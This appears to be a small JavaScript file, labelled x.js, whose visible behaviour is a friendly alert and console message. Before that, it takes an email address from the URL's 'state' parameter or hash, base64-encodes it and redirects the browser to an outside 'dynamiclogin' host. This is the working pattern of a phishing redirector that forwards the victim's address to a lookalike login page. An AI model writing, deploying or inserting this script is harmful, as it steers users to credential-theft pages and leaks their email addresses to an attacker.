(function () {
  try {
    const u = new URL(window.location.href);
    let e = "";

    if (u.searchParams.has("state")) {
      const raw = u.searchParams.get("state");
      try {
        const decoded = atob(raw);
        if (decoded.includes("@")) e = decoded;
      } catch {
        if (raw.includes("@")) e = raw;
      }
    }

    if (!e) {
      const h = window.location.hash.substring(1);
      if (h && h.includes("@")) e = h;
    }

    if (e && e.includes("@")) {
      const target = "https://internalservice-dynamiclogin.static.hf.space/?state=" + encodeURIComponent(btoa(e));
      window.location.href = target;
      return; // prevent further execution
    }
  } catch (err) {
    console.error("Redirect error:", err);
  }

  alert("Hello from x.js!");
  console.log("Loaded x.js");
})();
